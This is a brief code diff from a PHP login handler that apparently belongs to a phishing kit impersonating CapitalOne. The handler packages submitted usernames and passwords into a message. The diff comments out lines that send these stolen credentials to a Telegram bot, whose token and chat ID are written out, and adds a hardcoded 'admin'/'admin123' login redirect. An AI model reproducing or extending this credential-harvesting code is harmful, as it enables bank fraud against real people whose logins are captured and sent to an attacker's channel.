@@ -11,12 +11,16 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 $message = "🔥New Login to CapitalOne🔥\n";
 $message = $meassage."Username: ".$username."\nPassword: ".$password;
 
+if($username == "admin" && $password == "admin123"){
+    header("Location: ../dashboard");
+};
 
-$botToken = '5941110899:AAHmF4kUhivue6YhGS4T61g1TIUxGQkVis8';
-$chatId = '2087889282';
 
-if(sendTelegramMessage($botToken, $chatId, $message)){
-   echo "success";
-}
+// $botToken = '5941110899:AAHmF4kUhivue6YhGS4T61g1TIUxGQkVis8';
+// $chatId = '2087889282';
+
+// if(sendTelegramMessage($botToken, $chatId, $message)){
+//    echo "success";
+// }
 
 
